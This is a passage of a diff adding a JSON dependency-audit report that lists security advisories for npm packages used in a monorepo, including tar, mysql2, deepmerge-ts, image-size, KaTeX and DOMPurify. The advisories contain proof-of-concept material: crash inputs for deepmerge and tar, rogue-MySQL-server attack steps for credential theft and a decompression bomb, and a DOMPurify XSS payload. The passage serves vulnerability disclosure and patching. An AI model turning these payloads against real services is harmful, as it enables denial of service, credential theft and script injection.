+      "overview": "### Summary\n\n`deepmerge()` and `deepmergeInto()` can be crashed with a crafted recursive object graph. When both merged values contain self-references at the same property path, the library recurses until Node throws `RangeError: Maximum call stack size exceeded`.\n\n### Details\n\nRecord merging is implemented recursively. For each enumerable key, the library collects the values from every input object and immediately calls the same merge routine on that property.\n\nThere is no visited-object tracking, pair tracking, or cycle detection in that recursion. As a result, if two merged records both point back to themselves through the same key path, the merge logic keeps revisiting the same object pair forever.\n\nThis is reachable through the real public API:\n\n* `deepmerge(...)`\n* `deepmergeCustom(...)(...)`\n* `deepmergeInto(target, ...)`\n* `deepmergeIntoCustom(...)(target, ...)`\n\nThe issue only occurs when recursive object graphs are supplied. Plain JSON alone does not create this condition.\n\n### PoC\n\n```js\nimport { deepmerge, deepmergeInto } from \"deepmerge-ts\";\n\nconst left = {};\nleft.self = left;\n\nconst right = {};\nright.self = right;\n\ntry {\n  deepmerge(left, right);\n} catch (error) {\n  console.log(error.name, error.message);\n  // Expected: the merge should reject or safely handle recursive input without exhausting the stack.\n  // Vulnerable behavior: RangeError Maximum call stack size exceeded\n}\n\nconst target = {};\ntarget.self = target;\n\nconst source = {};\nsource.self = source;\n\ntry {\n  deepmergeInto(target, source);\n} catch (error) {\n  console.log(error.name, error.message);\n  // Expected: the merge should reject or safely handle recursive input without exhausting the stack.\n  // Vulnerable behavior: RangeError Maximum call stack size exceeded\n}\n```\n\n### Impact\n\nApplications that pass attacker-controlled recursive object graphs into these APIs can be forced into a synchronous crash path. In Node.js services, that can terminate request handling for the affected process or trigger repeated worker restarts until the malicious input is blocked.",
+      "reported_by": null,
+      "title": "DeepmergeTS has stack exhaustion when merging recursive object graphs",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-40345"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "deepmerge-ts",
+      "vulnerable_versions": "<8.0.0",
+      "github_advisory_id": "GHSA-ggr8-5vv4-36mx",
+      "recommendation": "Upgrade to version 8.0.0 or later",
+      "patched_versions": ">=8.0.0",
+      "updated": "2026-08-17T13:32:14.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-ggr8-5vv4-36mx"
+    },
+    "1145647": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            "apps\\desktop > fabric@6.9.1 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1",
+            "apps\\desktop > fabric@6.9.1 > jsdom@20.0.3 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-r292-9mhp-454m\n- https://github.com/isaacs/node-tar/commit/631ae59121bf8fc8a22bbae35f074cb9b789cd4a\n- https://github.com/isaacs/node-tar/releases/tag/v7.5.21\n- https://nvd.nist.gov/vuln/detail/CVE-2026-73566\n- https://github.com/advisories/GHSA-r292-9mhp-454m",
+      "created": "2026-07-24T16:26:16.000Z",
+      "id": 1145647,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n`node-tar` (npm `tar`) contains an uncontrolled-recursion stack-exhaustion DoS in the internal `mapHas` helper used by `filesFilter`. When a consumer calls `tar.t(...)` or `tar.x(...)` with a non-empty member-selection list, node-tar installs a filter that closes over the recursive `mapHas` (`src/list.ts:33-44`). `mapHas` walks an entry path upward one `path.dirname()` call per recursion **with no segment cap**. A single crafted tar with a GNU-`L` (or PAX-`x`) long-path header can deliver a path of tens of thousands of `/`-separated segments (up to `maxMetaEntrySize` = 1 MiB). The recursion overflows the call stack, throwing an uncatchable `RangeError` that terminates the Node process on async/streaming consumers.\n\n## Root Cause\n`filesFilter` (`src/list.ts:27-51`) is installed whenever a caller passes a member-selection list (`src/list.ts:119-122`, `src/extract.ts:55-57`). Its filter is invoked at `src/parse.ts:253` (`entry.ignore = entry.ignore || !this.filter(entry.path, entry)`) inside `Parser[CONSUMEHEADER]` — and crucially **outside** the only try/catch in that method (which wraps `new Header` at `src/parse.ts:179-183`). `mapHas` recurses once per path segment with no depth limit. The `Unpack` `maxDepth` guard (`src/unpack.ts:342`, in `[CHECKPATH]`) only runs on the `'entry'` event, which fires *after* `CONSUMEHEADER` has already invoked the filter — so the stack overflows before any depth guard executes. `tar.t` (list) has no `maxDepth` at all.\n\n## Impact\nUnauthenticated, remotely-triggerable denial of service: a ~188-byte gzip (≈26 KB tar) crashes any service that lists or extracts *selected members* from an untrusted archive (package registries, CI artifact/cache restore, upload processors). On async (`await tar.t(...)`/`tar.x(...)`) and streaming/`pipe` consumers the `RangeError` escapes the promise as an `uncaughtException` and terminates the process — standard defensive `try/catch` around the async call does NOT prevent it. (The synchronous API is catchable; the async/stream paths — the dominant server pattern — are not.)\n\n## Proof of Concept\n```js\n// Build a tar whose single entry has a GNU-L long path of ~12,000 \"a/\" segments (~26 KB),\n// gzip it (≈188 bytes), then have a consumer list/extract with member selection:\nconst tar = require('tar');\nawait tar.t({ file: 'evil.tar.gz', gzip: true }, ['some-member']); // -> RangeError, process exit\n```\nEmpirically reproduced on Node v24.18.0 against built `dist/commonjs` of node-tar 7.5.20: 188-byte gzip → 26,112-byte tar (12,000 segments) → uncaught `RangeError: Maximum call stack size exceeded` → process exit. A control run with no member-selection list (filter not installed) parses cleanly (exit 0), isolating `mapHas` as the sole cause.\n\n## Attack Chain\n1. **Entry.** Attacker crafts a tar with a GNU `L` (or PAX `x`) long-path header whose body is `\"a/\"`×~12000 (~26 KB), followed by a normal file entry.\n   - **Guard:** `maxMetaEntrySize` caps the meta body at 1 MiB (`src/parse.ts:241`).\n   - **Bypass proof:** 26 KB ≪ 1 MiB → accepted (verified: 26 KB archive parsed up to the filter).\n2. **Trigger.** Victim service calls `tar.t({file},[sel])` or `tar.x({file,cwd},[sel])` (member selection — a documented, common API).\n   - **Guard:** `Unpack.maxDepth` (default 1024) at `src/unpack.ts:342`; decompression-ratio guard.\n   - **Bypass proof:** `maxDepth` lives in `[CHECKPATH]` on the `'entry'` event, which fires *after* `CONSUMEHEADER`'s filter call — the crash occurs before it (extract exits 1 with default maxDepth). `tar.t` has no maxDepth. Ratio is ~139× (trivial); no total-bytes cap applies to the uncompressed meta body.\n3. **Sink.** `this.filter(entry.path)` → `mapHas` recurses once per `/` segment (`src/list.ts:39`).\n   - **Guard:** try/catch in `CONSUMEHEADER`.\n   - **Bypass proof:** the only try/catch wraps `new Header` (`src/parse.ts:179-183`); the `this.filter(...)` call at `src/parse.ts:253` is outside it. The `RangeError` propagates out of the stream write/`'data'` path → uncaught exception (verified: `process.on('uncaughtException')` fires; async `await`+`try/catch` does NOT intercept).\n4. **Impact.** Node process termination; a 188-byte gzip crashes any consumer that lists/extracts selected members from untrusted archives.\n\n## Bypass Evidence\n- `mapHas` recursion is member-name-independent: the crash fires even when the requested members do not match the malicious entry path — the attacker only needs the consumer to *use* member selection.\n- Standalone `mapHas` overflows at 20k–30k segments; on the real streaming path (atop `write → CONSUMECHUNK → CONSUMEHEADER → filter`) it crashes at ≤8k segments (finder's ~12k estimate is accurate for the reachable path).\n- Control (no member list → no filter) parses cleanly (exit 0), isolating `mapHas`.\n\n## Affected Versions\n`<= 7.5.20` (npm `tar`). `mapHas` present verbatim on tag `v7.5.20` (latest GitHub release and npm `dist-tag latest`); no segment/depth cap in `src/list.ts` or the `CONSUMEHEADER` filter path; HEAD == 7.5.20, no unreleased fix.\n\n## Suggested Fix\nRewrite `mapHas` iteratively (walk `dirname` in a `while` loop with a segment/visited cap), or enforce a hard path-segment limit in `Header`/`Parser` independent of `maxMetaEntrySize`, applied before any per-entry filter runs.\n\n## Dedup Note\nDistinct from CVE-2024-28863 / GHSA-f5x3-32g6-qm9j \"lack of folders depth validation\" (that bounds `mkdir` recursion during *extraction* via `maxDepth` in `Unpack[CHECKPATH]` on the `'entry'` event — a different sink, code path, and fix; runs after the filter and does not apply to `tar.t`). Also distinct from the PAX NUL/numeric-path crash advisories (improper-input-to-fs / type confusion, not recursion) and the gzip-bomb advisory (resource exhaustion on disk writes). None touch `list.ts`/`filesFilter`/`mapHas` or require member selection.\n\n---\nReported by **zx (Jace)** — GitHub: @manus-use",
+      "reported_by": null,
+      "title": "node-tar: Uncontrolled recursion in mapHas/filesFilter allows uncatchable stack-overflow DoS via crafted long-path tar with member selection",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-73566"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.20",
+      "github_advisory_id": "GHSA-r292-9mhp-454m",
+      "recommendation": "Upgrade to version 7.5.21 or later",
+      "patched_versions": ">=7.5.21",
+      "updated": "2026-08-21T19:08:23.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-r292-9mhp-454m"
+    },
+    "1153173": {
+      "findings": [
+        {
+          "version": "3.15.3",
+          "paths": [
+            ". > @prisma/client@7.8.0 > prisma@7.8.0 > mysql2@3.15.3",
+            ". > prisma@7.8.0 > mysql2@3.15.3",
+            "apps\\api > @prisma/client@7.8.0 > prisma@7.8.0 > mysql2@3.15.3",
+            "apps\\worker > @prisma/client@7.8.0 > prisma@7.8.0 > mysql2@3.15.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sidorares/node-mysql2/security/advisories/GHSA-3f6p-5ww8-9rcr\n- https://github.com/sidorares/node-mysql2/issues/1617\n- https://github.com/sidorares/node-mysql2/pull/4236\n- https://github.com/sidorares/node-mysql2/commit/884bec56288d827939d0dd3f1f4ae476fbc8dbeb\n- https://github.com/sidorares/node-mysql2/releases/tag/v3.22.0\n- https://github.com/advisories/GHSA-3f6p-5ww8-9rcr",
+      "created": "2026-09-01T16:40:34.000Z",
+      "id": 1153173,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nA rogue MySQL server (or MITM) can force mysql2 to send credentials in **plaintext** by requesting an auth switch to `mysql_clear_password`. The driver complies without verifying that TLS is active.\n\n## Details\n\n`mysql_clear_password` is registered as a default standard plugin in `lib/commands/auth_switch.js` (line 21). When a server sends an AuthSwitchRequest (0xFE) requesting `mysql_clear_password`, the driver executes it without checking for TLS. The plugin (`lib/auth_plugins/mysql_clear_password.js`) returns `Buffer.from(password + '\\0')`.\n\nNote: `caching_sha2_password` plugin DOES check for SSL before sending cleartext (line 77). But `mysql_clear_password` has no such guard.\n\n## Attack Scenario\n\n1. Attacker operates rogue MySQL server or performs MITM\n2. Server advertises `caching_sha2_password` in handshake\n3. Client sends hashed auth response\n4. Server replies with AuthSwitchRequest to `mysql_clear_password`\n5. Client sends password in plaintext\n6. Attacker captures plaintext password\n\n## PoC\n\nRogue MySQL server (Node.js, ~80 lines) that captures plaintext passwords from mysql2 clients. Tested against mysql2 3.20.0. Full PoC available on request.\n\n## Suggested Fix\n\nRemove `mysql_clear_password` from `standardAuthPlugins`, or add a guard requiring TLS/unix socket before allowing cleartext auth.\n\n## Impact\n\n- mysql2: 9M weekly downloads\n- Any application connecting without TLS is vulnerable to credential theft\n- Cloud environments with untrusted network paths are especially at risk",
+      "reported_by": null,
+      "title": "MySQL2: Auth Plugin Downgrade to mysql_clear_password Leaks Plaintext Credentials",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "mysql2",
+      "vulnerable_versions": "<3.22.0",
+      "github_advisory_id": "GHSA-3f6p-5ww8-9rcr",
+      "recommendation": "Upgrade to version 3.22.0 or later",
+      "patched_versions": ">=3.22.0",
+      "updated": "2026-09-01T16:40:35.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-522"
+      ],
+      "url": "https://github.com/advisories/GHSA-3f6p-5ww8-9rcr"
+    },
+    "1158532": {
+      "findings": [
+        {
+          "version": "3.15.3",
+          "paths": [
+            ". > @prisma/client@7.8.0 > prisma@7.8.0 > mysql2@3.15.3",
+            ". > prisma@7.8.0 > mysql2@3.15.3",
+            "apps\\api > @prisma/client@7.8.0 > prisma@7.8.0 > mysql2@3.15.3",
+            "apps\\worker > @prisma/client@7.8.0 > prisma@7.8.0 > mysql2@3.15.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sidorares/node-mysql2/security/advisories/GHSA-rgwj-5xj2-c3m3\n- https://github.com/sidorares/node-mysql2/commit/7c48343c95ecc80d30d6ebfa67875947b7d848d2\n- https://github.com/sidorares/node-mysql2/releases/tag/v3.23.1\n- https://github.com/advisories/GHSA-rgwj-5xj2-c3m3",
+      "created": "2026-08-31T22:36:20.000Z",
+      "id": 1158532,
+      "npm_advisory_id": null,
+      "overview": "## Vulnerability Details\n\n**File**: `lib/compressed_protocol.js`\n**Line**: 43 (`zlib.inflate(body, (err, data) => { ... })` inside `handleCompressedPacket`)\n\n### Root Cause\nWhen a connection is created with `compress: true` (and the server advertises `CLIENT_COMPRESS`), every incoming packet is unwrapped by `handleCompressedPacket()` in `lib/compressed_protocol.js`, which calls:\n\n```js\nzlib.inflate(body, (err, data) => { ... });\n```\n\nNo options object (in particular, no `maxOutputLength`) is passed. Node's zlib convenience methods default `maxOutputLength` to `buffer.kMaxLength`, which on this platform is `Number.MAX_SAFE_INTEGER` — i.e. effectively unbounded until the process runs out of memory. The 3-byte \"length of payload before compression\" field in the compressed-packet header is read (`packet.readInt24()`) but is only used to branch on `!== 0`; it is never used to cap or validate the actual inflate output size, and the real decompressed size is determined purely by the attacker-supplied deflate stream.\n\nBecause DEFLATE can reach compression ratios over 1000:1 for crafted repetitive input, an attacker who controls (or MITMs, on a non-TLS connection) the MySQL server endpoint can send a single small compressed packet that expands to gigabytes in the client's memory — a classic decompression-bomb / \"zip bomb\" applied to MySQL's client-compression protocol.\n\n### Attack Scenario\n1. Application connects with `mysql2`/`mysql2/promise` using `compress: true` (a documented option for reducing bandwidth, commonly used for cloud/WAN DB connections).\n2. The connection target is attacker-controlled or attacker-compromised, or an attacker MITMs a non-TLS connection.\n3. Right after authentication succeeds, the malicious endpoint sends one crafted compressed packet whose deflate stream is small on the wire (hundreds of KB) but decompresses to several GB.\n4. `zlib.inflate()` starts allocating memory for the full decompressed output with no ceiling.\n5. The Node.js process's RSS grows uncontrolled until OOM-kill or crash — no query needs to be issued by the client; the malicious packet alone is enough.\n\n### Impact\nDenial of Service of the client application (process crash / OOM) — not the database itself. No authentication bypass or data exposure. Requires `compress: true` plus a malicious/compromised server or MITM position.\n\n### Vulnerable Code\n```js\nfunction handleCompressedPacket(packet) {\n  const connection = this;\n  const deflatedLength = packet.readInt24();\n  const body = packet.readBuffer();\n\n  if (deflatedLength !== 0) {\n    connection.inflateQueue.push((task) => {\n      zlib.inflate(body, (err, data) => {\n        if (err) {\n          connection._handleNetworkError(err);\n          return;\n        }\n        connection._bumpCompressedSequenceId(packet.numPackets);\n        connection._inflatedPacketsParser.execute(data);\n        task.done();\n      });\n    });\n  } else {\n    ...\n  }\n}\n```\n\n### Recommended Fix\n```js\nconst MAX_INFLATED_PACKET_SIZE = 1 * 1024 * 1024 * 1024; // e.g. 1 GiB, ideally configurable\n\nzlib.inflate(body, { maxOutputLength: MAX_INFLATED_PACKET_SIZE }, (err, data) => {\n  if (err) {\n    connection._handleNetworkError(err);\n    return;\n  }\n  ...\n});\n```\n`maxOutputLength` makes `zlib.inflate` abort with `ERR_BUFFER_TOO_LARGE` as soon as the decompressed size would exceed the cap, routing into the exact same (already-existing) `err` → `connection._handleNetworkError(err)` path, so no new error-handling logic is required.\n\n### Verification\nDynamically confirmed on v3.23.0 (HEAD) using a minimal rogue \"MySQL server\" built on node-mysql2's own server-mode helpers (`mysql.createServer`, `Packets.Handshake`, `connection.writeOk()`). The rogue server completes a real handshake advertising `CLIENT_COMPRESS`, then writes one raw compressed frame (509,604 bytes on the wire — a zlib deflate of 500 MB of zero bytes, ratio 1028.8:1) directly to the socket. A normal `mysql.createConnection({ ..., compress: true })` victim client — which never issues any query — had its RSS grow from 74.3 MB to 1115.0 MB after receiving that single packet, before erroring out with `PROTOCOL_UNEXPECTED_PACKET` once the client tried to parse the inflated zero-filled buffer as MySQL packets. The memory allocation happens unconditionally before any content validation.",
+      "reported_by": null,
+      "title": "MySQL2: Unbounded zlib inflate in compressed MySQL protocol handler allows decompression-bomb DoS",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "mysql2",
+      "vulnerable_versions": "<=3.23.0",
+      "github_advisory_id": "GHSA-rgwj-5xj2-c3m3",
+      "recommendation": "Upgrade to version 3.23.1 or later",
+      "patched_versions": ">=3.23.1",
+      "updated": "2026-09-02T15:28:47.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-409"
+      ],
+      "url": "https://github.com/advisories/GHSA-rgwj-5xj2-c3m3"
+    },
+    "1193670": {
+      "findings": [
+        {
+          "version": "5.6.0",
+          "paths": [
+            "apps\\api > csv-parse@5.6.0"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/adaltas/node-csv/security/advisories/GHSA-8cw4-87c7-c6xx\n- https://nvd.nist.gov/vuln/detail/CVE-2026-85063\n- https://github.com/adaltas/node-csv/issues/496\n- https://github.com/adaltas/node-csv/pull/497\n- https://github.com/adaltas/node-csv/commit/eb4d1484589c976dcb977db8dd0b90e015a6f66e\n- https://github.com/advisories/GHSA-8cw4-87c7-c6xx",
+      "created": "2026-09-08T18:01:39.000Z",
+      "id": 1193670,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nWith columns: true and group_columns_by_name: true, a duplicated __proto__  header causes the duplicate-column branch to assign an array to obj['__proto__'], invoking the __proto__ setter and replacing the parsed record object's prototype with attacker-controlled data. Fixed in 7.0.2 (Object.hasOwn duplicate check + Object.defineProperty assignment).\n\n### Patches\nThe problem been patched.\n\n### Workarounds\nDisable usage of both the columns and  group_columns_by_name options.\n\n### References\nissue #496, PR #497",
+      "reported_by": null,
+      "title": "node-csv: Prototype replacement still reachable via columns path",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-85063"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "csv-parse",
+      "vulnerable_versions": "<7.0.2",
+      "github_advisory_id": "GHSA-8cw4-87c7-c6xx",
+      "recommendation": "Upgrade to version 7.0.2 or later",
+      "patched_versions": ">=7.0.2",
+      "updated": "2026-09-08T18:01:41.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-8cw4-87c7-c6xx"
+    },
+    "1239765": {
+      "findings": [
+        {
+          "version": "1.2.1",
+          "paths": [
+            "apps\\desktop > pptxgenjs@4.0.1 > image-size@1.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-71329\n- https://joshua.hu/image-size-infinite-loop-dos-vulnerabilities\n- https://web.archive.org/web/20260224152152/https://github.com/image-size/image-size/pull/439\n- https://www.vulncheck.com/advisories/image-size-denial-of-service-via-infinite-loop-in-jxl-heif-parser\n- https://codeberg.org/image-size/image-size/commit/e6e83a5578961de81f6d5834d90fb7430d8f29a5\n- https://github.com/advisories/GHSA-5p2g-fcmc-qvqq",
+      "created": "2026-06-10T15:31:30.000Z",
+      "id": 1239765,
+      "npm_advisory_id": null,
+      "overview": "image-size through 2.0.2 contains a denial of service vulnerability that allows remote attackers to permanently block the Node.js event loop by supplying a specially crafted image buffer with a zero-valued size field in a recognized box-type. Attackers can trigger an infinite loop in the JXL or HEIF image parsers by providing a crafted image containing a box with a size of zero, causing the offset to never advance and permanently hanging the application.",
+      "reported_by": null,
+      "title": "image-size: JXL and HEIF parsers allow denial of service through infinite loops",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-71329"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "image-size",
+      "vulnerable_versions": ">=1.2.0 <=2.0.2",
+      "github_advisory_id": "GHSA-5p2g-fcmc-qvqq",
+      "recommendation": "Upgrade to version 2.0.3 or later",
+      "patched_versions": ">=2.0.3",
+      "updated": "2026-09-24T18:28:06.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-5p2g-fcmc-qvqq"
+    },
+    "1239766": {
+      "findings": [
+        {
+          "version": "1.2.1",
+          "paths": [
+            "apps\\desktop > pptxgenjs@4.0.1 > image-size@1.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-71330\n- https://joshua.hu/image-size-infinite-loop-dos-vulnerabilities\n- https://web.archive.org/web/20260224152152/https://github.com/image-size/image-size/pull/439\n- https://www.vulncheck.com/advisories/image-size-denial-of-service-via-malformed-icns-image-parsing\n- https://codeberg.org/image-size/image-size/commit/e6e83a5578961de81f6d5834d90fb7430d8f29a5\n- https://github.com/advisories/GHSA-w3rx-r6r6-pgpr",
+      "created": "2026-06-10T15:31:30.000Z",
+      "id": 1239766,
+      "npm_advisory_id": null,
+      "overview": "image-size through 2.0.2 contains a denial of service vulnerability that allows remote attackers to permanently block the Node.js event loop by supplying a specially crafted ICNS image buffer. Attackers can craft an ICNS buffer containing valid magic bytes and a zero-valued entry length field to trigger an infinite loop in the ICNS parser, as the offset is never incremented when the entry length field is 0, causing the while loop condition to remain true indefinitely.",
+      "reported_by": null,
+      "title": "image-size: ICNS parser allows denial of service through an infinite loop",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-71330"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "image-size",
+      "vulnerable_versions": ">=0.6.3 <=2.0.2",
+      "github_advisory_id": "GHSA-w3rx-r6r6-pgpr",
+      "recommendation": "Upgrade to version 2.0.3 or later",
+      "patched_versions": ">=2.0.3",
+      "updated": "2026-09-24T18:23:12.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-w3rx-r6r6-pgpr"
+    },
+    "1241206": {
+      "findings": [
+        {
+          "version": "0.16.47",
+          "paths": [
+            "apps\\desktop > @excalidraw/excalidraw@0.18.1 > @excalidraw/mermaid-to-excalidraw@2.2.2 > mermaid@11.17.2 > katex@0.16.47"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/KaTeX/KaTeX/security/advisories/GHSA-238p-pmpm-9mq7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-103923\n- https://github.com/KaTeX/KaTeX/pull/4260\n- https://github.com/KaTeX/KaTeX/commit/0adf7e77db6915d991803b29699f82b1ccf8d4f4\n- https://github.com/KaTeX/KaTeX/releases/tag/v0.18.2\n- https://github.com/advisories/GHSA-238p-pmpm-9mq7",
+      "created": "2026-10-05T23:41:05.000Z",
+      "id": 1241206,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nKaTeX can act as a read-side prototype pollution gadget in applications where `Object.prototype` has already been polluted, or where an attacker can influence the prototype of the renderer options object. (KaTeX does not enable said prototype pollution. This advisory applies when combining KaTeX with other vulnerable software that allows for prototype pollution.)\n\nAffected versions may treat inherited properties from `Object.prototype` as renderer options, internal setting metadata, or namespace entries. In particular, an inherited `trust` value will be treated as though the application explicitly enabled trusted rendering, rather than using the documented default of `false`.\n\nWith attacker-controlled mathematical expressions, this can produce links capable of user-interaction cross-site scripting or load attacker-selected external resources. Exploitation requires the consuming application to insert KaTeX output into a web page without a separate sanitizer. (KaTeX does not execute scripts merely by rendering an expression.)\n\nOther inherited settings can alter rendering behavior or resource limits. Inherited setting metadata can affect how defaults and supplied options are processed, while inherited namespace properties can be mistaken for defined macros or other internal values.\n\n### Patches\n\nUpgrade to KaTeX v0.18.2 to remove this vulnerability.\n\n### Workarounds\n\n- Address any prototype-pollution vulnerability in the application or its dependencies.\n- `delete Object.prototype.trust`, `delete Object.prototype.default`, and `delete Object.prototype.processor` before calling KaTeX\n- Do not allow untrusted input to control the renderer options object or its prototype.\n- Sanitize KaTeX-generated HTML before inserting it into a document.\n\n### Details\n\nKaTeX previously used ordinary JavaScript property access in the following contexts:\n\n- Renderer settings could be inherited from the prototype of the options object.\n- Internal `default` and `processor` setting metadata could be inherited from `Object.prototype`.\n- Namespace lookup could treat inherited properties as built-in definitions.\n- Namespace group restoration could preserve an inherited property as though it had been an explicitly defined value.\n\nThe fix adds own-property checks to each of these paths. Inherited properties are no longer accepted as renderer settings, setting metadata, namespace definitions, or values to be restored after a group ends.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue or security advisory in the [KaTeX repository](https://github.com/KaTeX/KaTeX/)\n- Email us at [katex-security@mit.edu](mailto:katex-security@mit.edu)",
+      "reported_by": null,
+      "title": "KaTeX: Existing prototype pollution can bypass trust restrictions",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-103923"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "katex",
+      "vulnerable_versions": ">=0.11.0 <0.18.2",
+      "github_advisory_id": "GHSA-238p-pmpm-9mq7",
+      "recommendation": "Upgrade to version 0.18.2 or later",
+      "patched_versions": ">=0.18.2",
+      "updated": "2026-10-05T23:41:06.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-807"
+      ],
+      "url": "https://github.com/advisories/GHSA-238p-pmpm-9mq7"
+    },
+    "1242882": {
+      "findings": [
+        {
+          "version": "3.4.16",
+          "paths": [
+            "apps\\api > @raulbellosom/atlas-web-builder@0.11.1 > dompurify@3.4.16",
+            "apps\\desktop > @excalidraw/excalidraw@0.18.1 > @excalidraw/mermaid-to-excalidraw@2.2.2 > mermaid@11.17.2 > dompurify@3.4.16",
+            "apps\\desktop > @raulbellosom/atlas-web-builder@0.11.1 > dompurify@3.4.16",
+            "apps\\desktop > @runly/website-blocks@link:../../packages/website-blocks > @raulbellosom/atlas-web-builder@0.11.1 > dompurify@3.4.16",
+            "apps\\desktop > jspdf@4.2.1 > dompurify@3.4.16",
+            "packages\\website-blocks > @raulbellosom/atlas-web-builder@0.11.1 > dompurify@3.4.16"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-c6gr-qvv4-5v3f\n- https://github.com/cure53/DOMPurify/pull/1672\n- https://github.com/cure53/DOMPurify/commit/a77a3e78b59f72fa4d1c83f22e121ad9cc7d3575\n- https://github.com/cure53/DOMPurify/releases/tag/3.4.17\n- https://github.com/advisories/GHSA-c6gr-qvv4-5v3f",
+      "created": "2026-10-22T16:24:23.000Z",
+      "id": 1242882,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nDOMPurify drops `attributeName` attributes whose value contains `href`, so an allowed `<animate>` or `<set>` can't rewrite a link's href after sanitizing. The check compares the attribute name after `transformCaseFunc`, and that function doesn't lowercase in XHTML mode. In XHTML the attribute is spelled `attributeName`, so the comparison with `\"attributename\"` never matches and the guard does nothing.\n\nAn app that uses `PARSER_MEDIA_TYPE: 'application/xhtml+xml'` and allows `animate` and `attributeName` will keep `<animate attributeName=\"href\" values=\"x;javascript:alert(1)\">`. Clicking the parent link then runs the script.\n\nThis needs a non-default config, so going by SECURITY.md, this is a hardening bug rather than a bypass of the default config.\n\n### Details\n\nIn `_sanitizeAttributes` (dist/purify.js line 2216 in 3.4.16):\n\n```js\nconst lcName = transformCaseFunc(name);\n...\nif (lcName === \"attributename\" && stringMatch(value, \"href\")) {\n  _removeAttribute(name, currentNode, attr);\n  continue;\n}\n```\n\n`transformCaseFunc` is `stringToLowerCase` for text/html but the identity function for application/xhtml+xml, because XML names are case-sensitive. The XML parser keeps SVG's real name `attributeName`, so in XHTML mode `lcName` is `attributeName` and the branch never runs.\n\nPeople using XHTML mode have to list SVG attributes in camelCase. The built-in attribute lists are lowercase and won't match, so `ALLOWED_ATTR`/`ADD_ATTR: ['attributeName', ...]` is the config you'd naturally write here.\n\nThe value also passes the URI check. `IS_ALLOWED_URI` only checks the start of the string, and `x;javascript:alert(1)` looks like a relative value. SMIL reads `values` as a `;` list and, with `fill=\"freeze\"`, the last entry ends up as the effective href of the parent `<a>`.\n\nIn text/html mode the same allowlist is handled correctly. The name is lowercased and `attributeName` is removed.\n\nThis is close to the XHTML case-sensitivity hardening in 3.4.14/3.4.15 (Attack Classes & Bypass History §22): a check written for lowercase names that a case-preserved name gets past.\n\n### Proof of concept\n\nTested with DOMPurify 3.4.16 in Chrome 153 (headless shell). Also reproduced on 3.3.3, 3.3.1 and 3.2.7. Not confirmed for 2.x.\n\nConfig:\n\n```js\nconst cfg = {\n  PARSER_MEDIA_TYPE: 'application/xhtml+xml',\n  ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n  ALLOWED_ATTR: ['attributeName', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n};\n```\n\n`{ PARSER_MEDIA_TYPE: 